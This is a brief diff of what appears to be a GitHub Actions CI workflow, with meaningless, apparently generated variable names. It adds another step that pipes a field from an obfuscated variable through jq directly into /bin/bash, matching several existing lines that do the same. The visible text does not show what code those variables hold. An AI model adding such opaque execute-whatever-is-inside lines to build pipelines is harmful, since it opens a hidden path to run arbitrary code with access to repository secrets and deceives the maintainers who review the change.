@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$lvljb95388" | jq -r .seiin94 | /bin/bash
           echo $kxy1 | jq -r .z9 | /bin/bash
           echo $ovxxn27 | jq -r .v8 | /bin/bash
+          echo $rq3 | jq -r .is285 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
